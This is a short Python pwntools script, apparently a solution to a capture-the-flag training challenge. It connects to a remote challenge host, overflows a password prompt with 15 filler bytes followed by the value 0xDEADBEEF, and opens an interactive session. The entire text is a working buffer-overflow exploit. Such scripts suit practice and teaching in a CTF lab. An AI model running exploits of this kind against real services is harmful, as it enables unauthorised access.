from pwn import *

# r=process('./password')
r=remote("train2024.hitctf.cn",26568)

r.sendlineafter("input the password:",b'b'*15+p32(0x0DEADBEEF))
r.interactive()